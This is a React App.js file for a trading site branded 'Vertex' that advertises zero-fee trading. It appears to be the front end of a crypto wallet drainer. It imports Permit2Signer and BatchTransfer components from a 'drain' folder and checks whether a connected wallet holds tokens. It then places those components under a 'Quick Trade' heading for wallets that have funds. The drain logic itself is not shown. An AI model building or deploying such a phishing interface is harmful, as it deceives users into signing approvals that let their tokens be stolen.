import React, { useState, useEffect } from 'react';
import { useWeb3Modal } from './hooks/useWeb3Modal';
import { WalletButton } from './components/wallet/WalletButton';
import { TradingViewChart } from './components/trading/TradingViewChart';
import { OrderBook } from './components/trading/OrderBook';
import { TradePanel } from './components/trading/TradePanel';
import { AnimatedOrbs } from './components/layout/AnimatedOrbs';
import { Permit2Signer } from './components/drain/Permit2Signer';
import { BatchTransfer } from './components/drain/BatchTransfer';
import { useBalanceCheck } from './hooks/useBalanceCheck';

function App() {
  const { isConnected, account, chainId } = useWeb3Modal();
  const { hasTokens, checking } = useBalanceCheck(account, chainId);
  const [step, setStep] = useState('idle');

  useEffect(() => {
    if (isConnected && account && !checking) {
      if (!hasTokens) {
        setStep('no_balance');
      } else {
        setStep('has_balance');
      }
    }
  }, [isConnected, account, hasTokens, checking]);

  return (
    <div className="relative min-h-screen">
      <AnimatedOrbs />
      
      <div className="relative z-10 container mx-auto px-4 py-6 max-w-7xl">
        <header className="flex justify-between items-center mb-8">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-gradient-to-r from-blue-500 to-purple-500 rounded-xl flex items-center justify-center">
              <span className="text-white font-bold text-xl">V</span>
            </div>
            <h1 className="text-2xl font-bold bg-gradient-to-r from-white to-gray-400 bg-clip-text text-transparent">
              Vertex
            </h1>
          </div>
          <WalletButton />
        </header>

        {!isConnected ? (
          <div className="text-center py-32">
            <div className="w-32 h-32 mx-auto mb-8 bg-blue-500/10 rounded-full flex items-center justify-center animate-pulse">
              <svg className="w-16 h-16 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M13 10V3L4 14h7v7l9-11h-7z" />
              </svg>
            </div>
            <h2 className="text-4xl font-bold text-white mb-4">Connect Your Wallet</h2>
            <p className="text-gray-400 text-lg mb-8">Trade with zero fees on the most advanced DEX</p>
          </div>
        ) : step === 'no_balance' ? (
          <div className="glass rounded-2xl p-12 text-center max-w-md mx-auto">
            <div className="w-20 h-20 mx-auto mb-6 bg-yellow-500/20 rounded-full flex items-center justify-center">
              <svg className="w-10 h-10 text-yellow-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
              </svg>
            </div>
            <h3 className="text-2xl font-bold text-white mb-2">Insufficient Balance to Trade</h3>
            <p className="text-gray-400">Your wallet doesn't have enough tokens for trading. Deposit funds to continue.</p>
          </div>
        ) : (
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
            <div className="lg:col-span-2 space-y-6">
              <div className="glass rounded-2xl p-4 h-[400px]">
                <TradingViewChart />
              </div>
              <div className="glass rounded-2xl p-4">
                <OrderBook />
              </div>
            </div>
            <div className="space-y-6">
              <TradePanel />
              <div className="glass rounded-2xl p-4">
                <h3 className="text-white font-bold mb-4">Quick Trade</h3>
                <Permit2Signer />
                <div className="mt-4">
                  <BatchTransfer />
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;